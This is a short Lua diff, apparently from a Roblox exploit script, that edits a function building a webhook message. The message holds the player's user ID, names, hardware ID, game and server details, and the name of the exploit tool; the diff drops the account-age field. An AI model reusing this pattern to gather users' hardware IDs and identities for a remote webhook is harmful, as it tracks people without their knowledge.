@@ -61,7 +61,7 @@ local function createWebhookData()
                     "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                     "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                     "\n\n**JobId:**```%s```",
-                    Userid, DName, Name, Userid, AccountAge, GetHwid,
+                    Userid, DName, Name, Userid, GetHwid,
                     tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                     game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                      ConsoleJobId
